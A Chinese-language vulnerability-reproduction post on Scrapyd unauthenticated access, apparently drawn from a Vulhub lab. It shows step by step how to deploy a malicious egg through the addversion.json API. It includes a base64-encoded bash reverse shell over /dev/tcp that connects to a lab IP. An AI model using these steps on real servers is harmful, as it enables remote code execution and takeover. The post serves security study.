---
title: "Scrapyd 未授权访问漏洞"
date: 2026-10-16 09:09:08
categories:
  - WebSecurity
  - CVE
  - "Web应用"
  - "Scrapyd"
tags:
  - "Scrapyd"
  - "未授权访问"
  - "漏洞复现"
---
## 漏洞描述

scrapyd是爬虫框架scrapy提供的云服务，用户可以部署自己的scrapy包到云服务，默认监听在6800端口。如果攻击者能访问该端口，将可以部署恶意代码到服务器，进而获取服务器权限。

参考链接：

- https://www.leavesongs.com/PENETRATION/attack-scrapy.html

## 环境搭建

Vulhub执行如下命令启动scrapyd服务：

```
docker-compose up -d
```

环境启动后，访问`http://your-ip:6800`即可看到Web界面。

![image-20220228223956758](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/webapp/images/202202282239821.png)

## 漏洞复现

参考[攻击Scrapyd爬虫](https://www.leavesongs.com/PENETRATION/attack-scrapy.html)，构造一个恶意的scrapy包：

```
$ pip install scrapy scrapyd-client
$ scrapy startproject evil
$ cd evil
<details>
<summary>POC 代码（点击展开 · 仅供学习，请勿用于非授权测试）</summary>

<pre><code class="language-text">
编辑 `evil/__init__.py`, 加入恶意代码：

```python
import os

os.&#115;ystem('touch awesome_poc')</code></pre>

</details>

进行部署：

```
$ scrapyd-deploy --build-egg=evil.egg
```

向API接口发送恶意包：

```
curl http://your-ip:6800/addversion.json -F project=evil -F version=r01 -F egg=@evil.egg
```

成功执行命令`touch awesome_poc`：

![image-20220228225416938](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/webapp/images/202202282254990.png)

同样的方法实现反弹shell，编辑 `evil/__init__.py`, 加入恶意代码：

<details>
<summary>POC 代码（点击展开 · 仅供学习，请勿用于非授权测试）</summary>

<pre><code class="language-text">&#98;ash -i &gt;&amp; &#47;dev/tcp/192.168.174.128/9999 0&gt;&amp;1

# base64编码（必须要base64编码，直接&#98;ash -i &gt;&amp; &#47;dev/tcp/192.168.174.128/9999 0&gt;&amp;1是不行的）
YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjE3NC4xMjgvOTk5OSAwPiYxCgo=</code></pre>

</details>

<details>
<summary>POC 代码（点击展开 · 仅供学习，请勿用于非授权测试）</summary>

<pre><code class="language-python">import os

os.&#115;ystem('echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjE3NC4xMjgvOTk5OSAwPiYxCgo= | &#98;ase64 -d | bash')</code></pre>

</details>

进行部署：

```
$ scrapyd-deploy --build-egg=evil.egg
```

向API接口发送恶意包：

```
curl http://your-ip:6800/addversion.json -F project=evil -F version=r01 -F egg=@evil.egg
```

成功反弹shell：

![image-20220228230711087](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/webapp/images/202202282307169.png)

---

> 资料整理自 [Threekiii/Vulnerability-Wiki](https://github.com/Threekiii/Vulnerability-Wiki/blob/master/docs-base/docs/webapp/Scrapyd-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E.md)
